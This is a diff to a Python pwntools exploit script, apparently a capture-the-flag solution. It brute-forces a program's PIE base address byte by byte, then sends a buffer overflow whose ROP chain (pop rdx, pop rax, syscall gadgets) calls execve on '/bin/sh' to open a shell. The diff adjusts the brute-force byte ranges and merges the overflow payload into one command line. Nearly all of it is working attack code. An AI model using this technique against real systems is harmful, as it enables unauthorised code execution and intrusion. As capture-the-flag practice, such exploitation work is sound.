@@ -82,7 +82,7 @@ def brute_force():
     log.info("=== BRUTE FORCE ===")
     create(b"A"*8)
     start(0)
-    recv(0, b'1000')
+    recv(0, b'1000') # clean pipe
     
     target = [0x57]
     
@@ -90,12 +90,12 @@ def brute_force():
         if pos == 1:
             choices = [(n*16 + 0xb4) & 0xff for n in range(16)]
         elif pos == 5:
-            choices = list(range(0x55, 0x80)) + list(range(0, 0x55))
+            choices = list(range(0x70, 0x80)) + list(range(0, 0x70))
         else:
             choices = list(range(256))
             
         choices = [c for c in choices if c != 0x0a]
-        log.info(f"byte thứ {pos + 1}...")
+        log.info(f"byte {pos + 1}...")
         
         for choice in choices:
             if check(target, choice):
@@ -103,7 +103,7 @@ def brute_force():
                 log.success(f"-> byte {pos + 1} = 0x{choice:02x}")
                 break
         else:
-            log.error("BROP failed")
+            log.error("failed")    
             sys.exit(1)
             
     pie_base = u64(bytes(target) + b'\x00'*2) - 0xb457
@@ -119,14 +119,12 @@ def execv():
     pop_rdx = 0x00000000000836dc + exe.address # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
     pop_rax = 0x0000000000040dcb + exe.address
     machine_addr = 0xc5a20 + exe.address
-    leave_ret = 0x0000000000009e8a + exe.address
     name = b'/bin/sh\x00'
     if args.GDB:
         gdbscript = f'''
         set follow-fork-mode child
         b*fork+73
         b*main+1022
-        b*{hex(leave_ret)}
         continue
         '''
         gdb.attach(p, gdbscript=gdbscript)
@@ -144,10 +142,8 @@ def execv():
         syscall
     )
 
-    send(1, b'A'*0x118 +payload)
-    send(1, b'fail')
+    sl(b'send 1 fail\x00' + b'A'*275 + payload + b'\nrecv 1 1000\nrecv 1 9999999')
     time.sleep(0.5)
-    sl(b'recv 1 9999999')
 
 exe.address = brute_force()
 execv()
